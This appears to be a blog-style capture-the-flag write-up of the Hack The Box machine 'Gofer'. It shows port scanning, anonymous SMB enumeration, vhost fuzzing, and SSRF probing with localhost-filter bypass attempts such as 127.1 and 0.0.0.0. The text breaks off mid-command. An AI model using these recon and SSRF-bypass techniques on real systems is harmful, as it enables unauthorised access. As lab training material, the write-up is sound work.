+        <h1 id="gofer-htb" class="relative group">Gofer HTB <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#gofer-htb" aria-label="Anchor">#</a></span></h1><h2 id="overview" class="relative group">Overview <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#overview" aria-label="Anchor">#</a></span></h2><hr>
+<blockquote>
+<p>Gofer is a hard linux box, I discovered a HTTP proxy vulnerable to Server-Side Request Forgery. Utilizing this SSRF vulnerability, I sent a phishing email through the internal SMTP server via the gopher protocol, embedding a malicious macro that activates upon document opening. Next, I obtained user credentials from a background process linked to the proxy. Finally, I found a vulnerability in the <code>notes</code> binary, exploiting a use-after-free vulnerability associated with a dangling pointer.</p>
+</blockquote>
+<hr>
+<h2 id="enumeration" class="relative group">Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#enumeration" aria-label="Anchor">#</a></span></h2><hr>
+<h3 id="open-ports" class="relative group">Open Ports <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#open-ports" aria-label="Anchor">#</a></span></h3><p>Found 5 ports using nmap:</p>
+<ul>
+<li>Port 22 is running OpenSSH.</li>
+<li>Port 25 is likely blocked by a firewall as it appears to be filtered.</li>
+<li>Port 80 is hosting an Apache Web Server.</li>
+<li>Ports 139 and 445 are utilized for SMB over NetBIOS.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; nmap -p- -Pn -T4 --min-rate <span class="m">1000</span> --max-retries <span class="m">5</span> -oA nmap/10.10.11.225_fullScan 10.10.11.225
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-08-08 20:49 IST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.225
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.082s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65529</span> closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT     STATE    SERVICE
+</span></span><span class="line"><span class="cl">22/tcp   open     ssh
+</span></span><span class="line"><span class="cl">25/tcp   filtered smtp
+</span></span><span class="line"><span class="cl">80/tcp   open     http
+</span></span><span class="line"><span class="cl">139/tcp  open     netbios-ssn
+</span></span><span class="line"><span class="cl">445/tcp  open     microsoft-ds
+</span></span><span class="line"><span class="cl">8383/tcp open     m2mservices
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; nmap -p22,25,80,139,445,8383 -sV -sC -T4 -Pn -oA nmap/10.10.11.225 10.10.11.225
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-08-08 20:53 IST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.225
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.057s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT     STATE    SERVICE      VERSION
+</span></span><span class="line"><span class="cl">22/tcp   open     ssh          OpenSSH 8.4p1 Debian 5+deb11u1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> aa:25:82:6e:b8:04:b6:a9:a9:5e:1a:91:f0:94:51:dd <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 18:21:ba:a7:dc:e4:4f:60:d7:81:03:9a:5d:c2:e5:96 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> a4:2d:0d:45:13:2a:9e:7f:86:7a:f6:f7:78:bc:42:d9 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">25/tcp   filtered smtp
+</span></span><span class="line"><span class="cl">80/tcp   open     http         Apache httpd 2.4.56
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.56 <span class="o">(</span>Debian<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to http://gofer.htb/
+</span></span><span class="line"><span class="cl">139/tcp  open     netbios-ssn  Samba smbd 4.6.2
+</span></span><span class="line"><span class="cl">445/tcp  open     netbios-ssn  Samba smbd 4.6.2
+</span></span><span class="line"><span class="cl">8383/tcp open     m2mservices?
+</span></span><span class="line"><span class="cl">Service Info: Host: gofer.htb<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   3:1:1:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled but not required
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2023-08-08T15:24:51
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_nbstat: NetBIOS name: GOFER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span class="o">(</span>unknown<span class="o">)</span>
+</span></span></code></pre></div><h3 id="port-445---smb-enum" class="relative group">port 445 - SMB Enum <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#port-445---smb-enum" aria-label="Anchor">#</a></span></h3><p>SMB allows anonymous access and has a share named <code>shares</code> readable. CME also confirms the domain, <code>gofer.htb</code> from the anonymous bind. Although strangely, the OS is identified as Windows 6.1
+Enumerating SMB, discovered that it permits anonymous access and includes a readable share named &ldquo;shares.&rdquo; Moreover, <code>cme</code> verified the the <code>gofer.htb</code> domain through the anonymous bind.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; cme smb 10.10.11.225 -u <span class="s1">&#39;guest&#39;</span> -p <span class="s1">&#39;&#39;</span> --shares
+</span></span><span class="line"><span class="cl">SMB         10.10.11.225    <span class="m">445</span>    GOFER            <span class="o">[</span>*<span class="o">]</span> Windows 6.1 Build <span class="m">0</span> <span class="o">(</span>name:GOFER<span class="o">)</span> <span class="o">(</span>domain:htb<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.225    <span class="m">445</span>    GOFER            <span class="o">[</span>+<span class="o">]</span> htb<span class="se">\g</span>uest:
+</span></span><span class="line"><span class="cl">SMB         10.10.11.225    <span class="m">445</span>    GOFER            <span class="o">[</span>*<span class="o">]</span> Enumerated shares
+</span></span><span class="line"><span class="cl">SMB         10.10.11.225    <span class="m">445</span>    GOFER            Share           Permissions     Remark
+</span></span><span class="line"><span class="cl">SMB         10.10.11.225    <span class="m">445</span>    GOFER            -----           -----------     ------
+</span></span><span class="line"><span class="cl">SMB         10.10.11.225    <span class="m">445</span>    GOFER            print$                          Printer Drivers
+</span></span><span class="line"><span class="cl">SMB         10.10.11.225    <span class="m">445</span>    GOFER            shares          READ
+</span></span><span class="line"><span class="cl">SMB         10.10.11.225    <span class="m">445</span>    GOFER            IPC$                            IPC Service <span class="o">(</span>Samba 4.13.13-Debian<span class="o">)</span>
+</span></span></code></pre></div><p>I also discovered a file named <code>mail</code> within a hidden backup directory on the <code>shares</code> share by using CrackMapExec&rsquo;s spider_plus module.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; cme smb 10.10.11.225 -u <span class="s1">&#39;guest&#39;</span> -p <span class="s1">&#39;&#39;</span>  -M spider_plus -o <span class="nv">READ_ONLY</span><span class="o">=</span><span class="nb">false</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.225    <span class="m">445</span>    GOFER            <span class="o">[</span>*<span class="o">]</span> Windows 6.1 Build <span class="m">0</span> <span class="o">(</span>name:GOFER<span class="o">)</span> <span class="o">(</span>domain:htb<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.225    <span class="m">445</span>    GOFER            <span class="o">[</span>+<span class="o">]</span> htb<span class="se">\g</span>uest:
+</span></span><span class="line"><span class="cl">SPIDER_P... 10.10.11.225    <span class="m">445</span>    GOFER            <span class="o">[</span>*<span class="o">]</span> Started module spidering_plus with the following options:
+</span></span><span class="line"><span class="cl">SPIDER_P... 10.10.11.225    <span class="m">445</span>    GOFER            <span class="o">[</span>*<span class="o">]</span>  DOWNLOAD_FLAG: False
+</span></span><span class="line"><span class="cl">SPIDER_P... 10.10.11.225    <span class="m">445</span>    GOFER            <span class="o">[</span>*<span class="o">]</span>     STATS_FLAG: True
+</span></span><span class="line"><span class="cl">SPIDER_P... 10.10.11.225    <span class="m">445</span>    GOFER            <span class="o">[</span>*<span class="o">]</span> EXCLUDE_FILTER: <span class="o">[</span><span class="s1">&#39;print$&#39;</span>, <span class="s1">&#39;ipc$&#39;</span><span class="o">]</span>
+</span></span><span class="line"><span class="cl">SPIDER_P... 10.10.11.225    <span class="m">445</span>    GOFER            <span class="o">[</span>*<span class="o">]</span>   EXCLUDE_EXTS: <span class="o">[</span><span class="s1">&#39;ico&#39;</span>, <span class="s1">&#39;lnk&#39;</span><span class="o">]</span>
+</span></span><span class="line"><span class="cl">SPIDER_P... 10.10.11.225    <span class="m">445</span>    GOFER            <span class="o">[</span>*<span class="o">]</span>  MAX_FILE_SIZE: <span class="m">50</span> KB
+</span></span><span class="line"><span class="cl">SPIDER_P... 10.10.11.225    <span class="m">445</span>    GOFER            <span class="o">[</span>*<span class="o">]</span>  OUTPUT_FOLDER: /tmp/cme_spider_plus
+</span></span><span class="line"><span class="cl">SPIDER_P... 10.10.11.225    <span class="m">445</span>    GOFER            <span class="o">[</span>+<span class="o">]</span> Saved share-file metadata to <span class="s2">&#34;/tmp/cme_spider_plus/10.10.11.225.json&#34;</span>.
+</span></span><span class="line"><span class="cl">SPIDER_P... 10.10.11.225    <span class="m">445</span>    GOFER            <span class="o">[</span>*<span class="o">]</span> SMB Shares:           <span class="m">3</span> <span class="o">(</span>print$, shares, IPC$<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SPIDER_P... 10.10.11.225    <span class="m">445</span>    GOFER            <span class="o">[</span>*<span class="o">]</span> SMB Readable Shares:  <span class="m">1</span> <span class="o">(</span>shares<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SPIDER_P... 10.10.11.225    <span class="m">445</span>    GOFER            <span class="o">[</span>*<span class="o">]</span> Total folders found:  <span class="m">1</span>
+</span></span><span class="line"><span class="cl">SPIDER_P... 10.10.11.225    <span class="m">445</span>    GOFER            <span class="o">[</span>*<span class="o">]</span> Total files found:    <span class="m">1</span>
+</span></span><span class="line"><span class="cl">SPIDER_P... 10.10.11.225    <span class="m">445</span>    GOFER            <span class="o">[</span>*<span class="o">]</span> File size average:    1.08 KB
+</span></span><span class="line"><span class="cl">SPIDER_P... 10.10.11.225    <span class="m">445</span>    GOFER            <span class="o">[</span>*<span class="o">]</span> File size min:        1.08 KB
+</span></span><span class="line"><span class="cl">SPIDER_P... 10.10.11.225    <span class="m">445</span>    GOFER            <span class="o">[</span>*<span class="o">]</span> File size max:        1.08 KB
+</span></span><span class="line"><span class="cl">&gt; cat /tmp/cme_spider_plus/10.10.11.225.json
+</span></span><span class="line"><span class="cl"><span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;shares&#34;</span>: <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;.backup/mail&#34;</span>: <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;atime_epoch&#34;</span>: <span class="s2">&#34;2023-08-08 11:47:32&#34;</span>,
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;ctime_epoch&#34;</span>: <span class="s2">&#34;2023-04-27 18:19:32&#34;</span>,
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;mtime_epoch&#34;</span>: <span class="s2">&#34;2023-04-27 18:19:32&#34;</span>,
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;size&#34;</span>: <span class="s2">&#34;1.08 KB&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><p>After retrieving the content of the &ldquo;main&rdquo; file using smbclient,</p>
+<ul>
+<li>The email indicates the presence of an internal SMTP server, as the mail is received from localhost.</li>
+<li>Based on the email addresses in the &ldquo;to&rdquo; and &ldquo;from&rdquo; fields, identified two potential usernames:
+<ul>
+<li><code>jdavis</code></li>
+<li><code>tbuckley</code></li>
+</ul>
+</li>
+<li>The email mentions a phishing attempt on Jocelyn, who appears to be susceptible to clicking on links.</li>
+<li>Additionally, the email emphasizes that any important documents should be sent exclusively through the internal mail server and in the <code>.odt</code> format.</li>
+<li>It is also noted that a web proxy is under development, and because of it&rsquo;s potential security concerns, it may have restricted access.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; smbclient -N //10.10.11.225/shares
+</span></span><span class="line"><span class="cl">Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> get .backup<span class="se">\m</span>ail -
+</span></span><span class="line"><span class="cl">From jdavis@gofer.htb  Fri Oct <span class="m">28</span> 20:29:30 <span class="m">2022</span>
+</span></span><span class="line"><span class="cl">Return-Path: &lt;jdavis@gofer.htb&gt;
+</span></span><span class="line"><span class="cl">X-Original-To: tbuckley@gofer.htb
+</span></span><span class="line"><span class="cl">Delivered-To: tbuckley@gofer.htb
+</span></span><span class="line"><span class="cl">Received: from gofer.htb <span class="o">(</span>localhost <span class="o">[</span>127.0.0.1<span class="o">])</span>
+</span></span><span class="line"><span class="cl">        by gofer.htb <span class="o">(</span>Postfix<span class="o">)</span> with SMTP id C8F7461827
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> &lt;tbuckley@gofer.htb&gt;<span class="p">;</span> Fri, <span class="m">28</span> Oct <span class="m">2022</span> 20:28:43 +0100 <span class="o">(</span>BST<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Subject:Important to read!
+</span></span><span class="line"><span class="cl">Message-Id: &lt;20221028192857.C8F7461827@gofer.htb&gt;
+</span></span><span class="line"><span class="cl">Date: Fri, <span class="m">28</span> Oct <span class="m">2022</span> 20:28:43 +0100 <span class="o">(</span>BST<span class="o">)</span>
+</span></span><span class="line"><span class="cl">From: jdavis@gofer.htb
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Hello guys,
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Our dear Jocelyn received another phishing attempt last week and his habit of clicking on links without paying much attention may be problematic one day. That<span class="s1">&#39;s why from now on, I&#39;</span>ve decided that important documents will only be sent internally, by mail, which should greatly limit the risks. If possible, use an .odt format, as documents saved in Office Word are not always well interpreted by Libreoffice.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PS: Last thing <span class="k">for</span> Tom<span class="p">;</span> I know you<span class="err">&#39;</span>re working on our web proxy but <span class="k">if</span> you could restrict access, it will be more secure <span class="k">until</span> you have finished it. It seems to me that it should be possible to <span class="k">do</span> so via &lt;Limit&gt;
+</span></span><span class="line"><span class="cl">getting file <span class="se">\.</span>backup<span class="se">\m</span>ail of size <span class="m">1101</span> as - <span class="o">(</span>1.4 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 1.2 KiloBytes/sec<span class="o">)</span>
+</span></span></code></pre></div><h3 id="http---goferhtb" class="relative group">HTTP - gofer.htb <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#http---goferhtb" aria-label="Anchor">#</a></span></h3><p>Analyzing the headers, it appears that the web service redirects to the <code>gofer.htb</code> virtual host. However, the headers do not provide any other substantial information.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; http -ph 10.10.11.225
+</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">301</span> Moved Permanently
+</span></span><span class="line"><span class="cl">Connection: Keep-Alive
+</span></span><span class="line"><span class="cl">Content-Length: <span class="m">303</span>
+</span></span><span class="line"><span class="cl">Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>iso-8859-1
+</span></span><span class="line"><span class="cl">Date: Tue, <span class="m">08</span> Aug <span class="m">2023</span> 15:28:43 GMT
+</span></span><span class="line"><span class="cl">Keep-Alive: <span class="nv">timeout</span><span class="o">=</span>5, <span class="nv">max</span><span class="o">=</span><span class="m">100</span>
+</span></span><span class="line"><span class="cl">Location: http://gofer.htb/
+</span></span><span class="line"><span class="cl">Server: Apache/2.4.56 <span class="o">(</span>Debian<span class="o">)</span>
+</span></span></code></pre></div><p>The website is designed for bootstrap developers, but unfortunately, none of its features are functioning.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/index-page.png" alt="index-page" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<h4 id="fuzzing" class="relative group">Fuzzing <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#fuzzing" aria-label="Anchor">#</a></span></h4><p>I tried fuzzing for directories and files using <code>ffuf</code>, but didn&rsquo;t find anything noteworthy.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://gofer.htb//FUZZ -o ffuf_gofer.md -of md -t <span class="m">100</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">.hta                    <span class="o">[</span>Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 6204ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.htaccess               <span class="o">[</span>Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 6214ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.htpasswd               <span class="o">[</span>Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 6232ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">assets                  <span class="o">[</span>Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 2298ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">index.html              <span class="o">[</span>Status: 200, Size: 29380, Words: 7647, Lines: 622, Duration: 1256ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">server-status           <span class="o">[</span>Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 1226ms<span class="o">]</span>
+</span></span></code></pre></div><p>I had a valid virtual host, so I used <code>wfuzz</code> to identify any additional virtual hosts and came across one named <code>proxy</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; wfuzz_subdomain_enum gofer.htb --hw <span class="m">28</span>
+</span></span><span class="line"><span class="cl">********************************************************
+</span></span><span class="line"><span class="cl">* Wfuzz 3.1.0 - The Web Fuzzer                         *
+</span></span><span class="line"><span class="cl">********************************************************
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Target: http://gofer.htb/
+</span></span><span class="line"><span class="cl">Total requests: <span class="nv">4989</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">=====================================================================</span>
+</span></span><span class="line"><span class="cl">ID           Response   Lines    Word       Chars       <span class="nv">Payload</span>
+</span></span><span class="line"><span class="cl"><span class="o">=====================================================================</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">000000084:   <span class="m">401</span>        <span class="m">14</span> L     <span class="m">54</span> W       <span class="m">462</span> Ch      <span class="s2">&#34;proxy&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Total time: 213.0168
+</span></span><span class="line"><span class="cl">Processed Requests: <span class="m">4989</span>
+</span></span><span class="line"><span class="cl">Filtered Requests: <span class="m">4988</span>
+</span></span><span class="line"><span class="cl">Requests/sec.: 23.42068
+</span></span></code></pre></div><hr>
+<h2 id="initial-foothold" class="relative group">Initial Foothold <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#initial-foothold" aria-label="Anchor">#</a></span></h2><hr>
+<h3 id="http---proxygoferhtb" class="relative group">HTTP - proxy.gofer.htb <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#http---proxygoferhtb" aria-label="Anchor">#</a></span></h3><p>A GET request to <code>proxy.gofer.htb</code> returns a 401 error and required basic authentication.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ http -ph proxy.gofer.htb
+</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">401</span> Unauthorized
+</span></span><span class="line"><span class="cl">Connection: Keep-Alive
+</span></span><span class="line"><span class="cl">Content-Length: <span class="m">462</span>
+</span></span><span class="line"><span class="cl">Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>iso-8859-1
+</span></span><span class="line"><span class="cl">Date: Tue, <span class="m">24</span> Oct <span class="m">2023</span> 23:06:58 GMT
+</span></span><span class="line"><span class="cl">Keep-Alive: <span class="nv">timeout</span><span class="o">=</span>5, <span class="nv">max</span><span class="o">=</span><span class="m">100</span>
+</span></span><span class="line"><span class="cl">Server: Apache/2.4.56 <span class="o">(</span>Debian<span class="o">)</span>
+</span></span><span class="line"><span class="cl">WWW-Authenticate: Basic <span class="nv">realm</span><span class="o">=</span><span class="s2">&#34;Restricted Content&#34;</span>
+</span></span></code></pre></div><p>I also tried fuzzing the &ldquo;proxy&rdquo; virtual host, but it didn&rsquo;t lead to anything significant.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://proxy.gofer.htb/FUZZ -o ffuf_proxy.md -of md -t <span class="m">100</span> -fs <span class="m">462</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">.hta                    <span class="o">[</span>Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 6694ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.htaccess               <span class="o">[</span>Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 6728ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.htpasswd               <span class="o">[</span>Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 6817ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">server-status           <span class="o">[</span>Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 56ms<span class="o">]</span>
+</span></span></code></pre></div><p>Since the email referenced restricted access, I also fuzzed <code>proxy</code> for POST requests and that returns a 200 for <code>index.php</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; ffuf -X POST -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://proxy.gofer.htb/FUZZ -o ffuf_proxy_post.md -of md -t <span class="m">100</span> -fs <span class="m">462</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">.hta                    <span class="o">[</span>Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 71ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.htpasswd               <span class="o">[</span>Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 4692ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.htaccess               <span class="o">[</span>Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 4707ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">index.php               <span class="o">[</span>Status: 200, Size: 81, Words: 9, Lines: 2, Duration: 59ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">server-status           <span class="o">[</span>Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 60ms<span class="o">]</span>
+</span></span></code></pre></div><p>When making a POST request to <code>index.php</code>, it raises an error about a missing URL parameter, could be a potential Server-Side Request Forgery (SSRF) vulnerability.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; http POST proxy.gofer.htb/index.php
+</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl">Connection: Keep-Alive
+</span></span><span class="line"><span class="cl">Content-Encoding: gzip
+</span></span><span class="line"><span class="cl">Content-Length: <span class="m">94</span>
+</span></span><span class="line"><span class="cl">Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+</span></span><span class="line"><span class="cl">Date: Tue, <span class="m">08</span> Aug <span class="m">2023</span> 18:28:34 GMT
+</span></span><span class="line"><span class="cl">Keep-Alive: <span class="nv">timeout</span><span class="o">=</span>5, <span class="nv">max</span><span class="o">=</span><span class="m">100</span>
+</span></span><span class="line"><span class="cl">Server: Apache/2.4.56 <span class="o">(</span>Debian<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Vary: Accept-Encoding
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;!-- Welcome to Gofer proxy --&gt;
+</span></span><span class="line"><span class="cl">&lt;html&gt;&lt;body&gt;Missing URL parameter !&lt;/body&gt;&lt;/html&gt;
+</span></span></code></pre></div><h3 id="exploiting--ssrf" class="relative group">Exploiting  SSRF <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#exploiting--ssrf" aria-label="Anchor">#</a></span></h3><p>Given that the index page only accepts POST requests, I assumed it would require either raw or JSON POST data for proper interaction. However, it only accepts the <code>url</code> param as GET parameter. For <code>httpie</code>, POST parameters are set using <code>=</code> and GET parameters can be set using <code>==</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; http -pb POST proxy.gofer.htb/index.php <span class="nv">url</span><span class="o">=</span>http://localhost
+</span></span><span class="line"><span class="cl">&lt;!-- Welcome to Gofer proxy --&gt;
+</span></span><span class="line"><span class="cl">&lt;html&gt;&lt;body&gt;Missing URL parameter !&lt;/body&gt;&lt;/html&gt;
+</span></span></code></pre></div><p>When attempting to exploit the SSRF vulnerability, I discovered that words like <code>localhost</code> and its common bypasses were blacklisted.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; http -pb POST proxy.gofer.htb/index.php <span class="nv">url</span><span class="o">==</span>http://localhost
+</span></span><span class="line"><span class="cl">&lt;!-- Welcome to Gofer proxy --&gt;
+</span></span><span class="line"><span class="cl">&lt;html&gt;&lt;body&gt;Blacklisted keyword: localhost !&lt;/body&gt;&lt;/html&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&gt; http -pb POST proxy.gofer.htb/index.php <span class="nv">url</span><span class="o">==</span>http://127.1
+</span></span><span class="line"><span class="cl">&lt;!-- Welcome to Gofer proxy --&gt;
+</span></span><span class="line"><span class="cl">&lt;html&gt;&lt;body&gt;Blacklisted keyword: /127 !&lt;/body&gt;&lt;/html&gt;
+</span></span></code></pre></div><p>I experimented with various bypass attempts and observed that <code>0.0.0.0</code> was not blacklisted. However, despite this bypass, it didn&rsquo;t provide a solution. I also attempted to access the filtered SMTP port, but unfortunately, it did not yield any results.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ http -pb POST proxy.gofer.htb/index.php <span class="nv">url</span><span class="o">==</span>http://0.0.0.0:25
+</span></span><span class="line"><span class="cl">&lt;!-- Welcome to Gofer proxy --&gt;
